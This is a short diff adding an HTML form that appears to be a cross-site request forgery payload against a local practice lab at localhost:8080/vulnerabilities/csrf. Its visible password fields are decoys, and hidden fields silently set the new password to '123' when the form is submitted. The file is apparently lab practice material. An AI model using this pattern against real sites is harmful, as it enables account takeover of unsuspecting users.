@@ -1,0 +1,11 @@
+<form action="http://localhost:8080/vulnerabilities/csrf" method="GET">
+			New password:<br />
+			<input type="password" AUTOCOMPLETE="off" name="p_new"><br />
+			<input type="hidden" name="password_new" value="123">
+			Confirm new password:<br />
+			<input type="password" AUTOCOMPLETE="off" name="p_conf"><br />
+			<input type="hidden" name="password_conf" value="123">
+			<br />
+			<input type="submit" value="Change" name="Change">
+
+</form>
